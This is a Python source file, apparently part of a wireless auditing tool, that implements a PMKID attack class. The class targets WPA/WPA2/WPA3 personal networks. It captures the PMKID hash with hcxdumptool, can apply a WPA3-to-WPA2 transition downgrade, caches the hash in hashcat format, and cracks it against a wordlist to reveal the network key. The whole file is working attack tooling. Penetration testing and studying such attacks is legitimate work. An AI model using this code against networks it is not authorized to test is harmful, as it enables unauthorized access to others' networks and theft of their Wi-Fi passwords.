"""PMKID capture and crack attack."""

from __future__ import annotations

import os
import re
import time
from contextlib import nullcontext
from datetime import datetime, timezone

from ..models import CrackResult, EncryptionType, PMKIDCaptureInfo
from ..tools.pmkid_capture import capture_pmkid_extended
from ..tools.transition import hash_key_type, strategy_summary, transition_downgrade_enabled
from ..tools.interface import recover_interface
from .base import Attack, AttackResult


class PMKIDAttack(Attack):
    name = "pmkid"

    def can_attack(self) -> bool:
        if not self.cfg.attack.pmkid:
            return False
        if self.ap.encryption not in (EncryptionType.WPA, EncryptionType.WPA2, EncryptionType.WPA3):
            return False
        if self.ap.is_enterprise:
            return False
        return True

    def _restore_radio(self) -> None:
        iface = recover_interface(
            self.cfg.scan.interface, self.ap.channel, band=self.ap.radio_band,
        )
        if iface != self.cfg.scan.interface:
            self.tracker.log(
                f"Monitor interface is now [cyan]{iface}[/] (was {self.cfg.scan.interface})",
                tag="pmkid",
            )
            self.cfg.scan.interface = iface
        self.tracker.log("Interface restored for handshake capture", tag="pmkid")

    def _existing_hash(self) -> str | None:
        if self.cfg.attack.new_handshake:
            return None
        hs_dir = self.cfg.output.handshake_dir
        if not os.path.isdir(hs_dir):
            return None
        bssid_target = self.ap.bssid.replace(":", "").lower()
        for fname in os.listdir(hs_dir):
            if not fname.endswith(".22000"):
                continue
            path = os.path.join(hs_dir, fname)
            with open(path) as f:
                for line in f:
                    parts = line.strip().split("*")
                    if len(parts) >= 4 and parts[3].lower().replace(":", "") == bssid_target:
                        return line.strip()
        return None

    def _save_hash(self, hash_line: str) -> str:
        essid_safe = re.sub(r"[^a-zA-Z0-9]", "", self.ap.display_name)
        bssid_safe = self.ap.bssid.replace(":", "-")
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        path = os.path.join(
            self.cfg.output.handshake_dir,
            f"pmkid_{essid_safe}_{bssid_safe}_{ts}.22000",
        )
        with open(path, "w") as f:
            f.write(hash_line + "\n")
        return path

    def _build_capture_info(
        self,
        hash_line: str,
        hash_file: str,
        *,
        source: str,
    ) -> PMKIDCaptureInfo:
        if source == "cached":
            summary = "Recovered existing PMKID hash from hs/ — no new capture required"
        else:
            summary = "Clientless PMKID captured via hcxdumptool (passive AP probe)"
        return PMKIDCaptureInfo(
            summary=summary,
            hash_file=hash_file,
            channel=self.ap.channel,
            bssid=self.ap.bssid,
            essid=self.ap.display_name,
            hash_type=hash_key_type(hash_line),
            source=source,
            show_banner=True,
        )

    def _confirm_pmkid(self, hash_line: str, hash_file: str, *, source: str) -> bool:
        from ..display import show_pmkid_captured
        from ..input import prompt_space_to_continue

        self._pmkid_capture_info = self._build_capture_info(
            hash_line, hash_file, source=source,
        )
        interactive = not (
            self.cfg.auto_mode
            or self.cfg.output.quiet
            or self.cfg.output.json_output
        )
        if interactive:
            suspend_ctx = self.tracker.suspend_live()
        else:
            suspend_ctx = nullcontext()
        with suspend_ctx:
            show_pmkid_captured(self.ap, self._pmkid_capture_info)
            if interactive:
                prompt_space_to_continue(
                    message="PMKID ready — press SPACE to continue to cracking",
                )
                self._preresolved_wordlist = self._resolve_crack_wordlist(
                    already_suspended=True,
                )
        self.tracker.log(
            f"[green]PMKID ready[/] — {self._pmkid_capture_info.summary}",
            tag="pmkid",
        )
        return True

    def run(self) -> AttackResult:
        self.tracker.clear_skip()
        started = time.time()
        timeout = self.cfg.attack.pmkid_timeout
        prefer_wpa2 = transition_downgrade_enabled(self.cfg, self.ap)
        if prefer_wpa2:
            summary = strategy_summary(self.ap)
            if summary:
                self.tracker.log(f"[cyan]Transition strategy[/] — {summary}", tag="pmkid")
        hash_line = self._existing_hash()
        capture_file = ""
        pmkid_source = "live"

        if hash_line:
            self.status("capture", "Using cached PMKID hash", timeout=timeout, started=started)
            self.tracker.log(f"Found existing hash for {self.ap.display_name}", tag="pmkid")
            capture_file = "cached"
            pmkid_source = "cached"
        else:
            pcapng = os.path.join(
                self.cfg.output.data_dir,
                f"pmkid_{self.ap.bssid.replace(':', '')}.pcapng",
            )

            def on_tick(elapsed: float, pcap_kb: int):
                remaining = max(0, int(timeout - elapsed))
                self.status(
                    "capture",
                    f"hcxdumptool listening ({remaining}s left)",
                    timeout=timeout, started=started, pcap_kb=pcap_kb,
                )

            self.status("capture", "Starting hcxdumptool...", timeout=timeout, started=started)
            self.tracker.log(f"Capturing PMKID from {self.ap.bssid}...", tag="pmkid")

            try:
                pool = self.tracker.discovered_targets or self.tracker.targets
                hash_line = capture_pmkid_extended(
                    self.cfg,
                    self.ap,
                    pool,
                    pcapng,
                    timeout,
                    on_tick=on_tick,
                    on_log=lambda msg: self.tracker.log(msg, tag="pmkid"),
                    should_stop=self.should_stop,
                    prefer_wpa2=prefer_wpa2,
                )
                if self.should_stop():
                    return self.skipped_result()
                if hash_line:
                    capture_file = self._save_hash(hash_line)
                    self.tracker.log("[green]PMKID hash captured![/]", tag="pmkid")
            finally:
                # Always restore the radio — hcxdumptool blocks airodump until this runs
                self._restore_radio()

        if not hash_line:
            self.status("failed", "No PMKID received", started=started)
            self.tracker.log(
                "[yellow]PMKID timed out — continuing with handshake capture[/]",
                tag="plan",
            )
            return AttackResult(False, message="PMKID capture failed")

        if self.cfg.attack.skip_crack or not self.cfg.attack.wordlist:
            self.status("done", "Hash saved (crack skipped)", started=started)
            return AttackResult(True, message="PMKID captured (crack skipped)")

        self.status("capture", "PMKID captured — ready to crack", timeout=timeout, started=started)
        self._preresolved_wordlist = None
        if not self._confirm_pmkid(hash_line, capture_file, source=pmkid_source):
            return AttackResult(False, message="PMKID confirmation failed")

        key = self.crack_hashcat(hash_line, started)
        if self.should_stop():
            return self.skipped_result()
        if key:
            crack = CrackResult(
                bssid=self.ap.bssid, essid=self.ap.display_name, key=key,
                method="pmkid", capture_file=capture_file,
                cracked_at=datetime.now(timezone.utc).isoformat(),
            )
            self.status("cracked", f"Key found: {key}", started=started)
            return AttackResult(True, crack=crack, message=f"PMKID cracked: {key}")

        self.status("failed", "Password not in wordlist", started=started)
        self.tracker.log(
            "[yellow]PMKID not cracked — continuing with handshake capture[/]",
            tag="plan",
        )
        return AttackResult(False, message="PMKID captured but not cracked")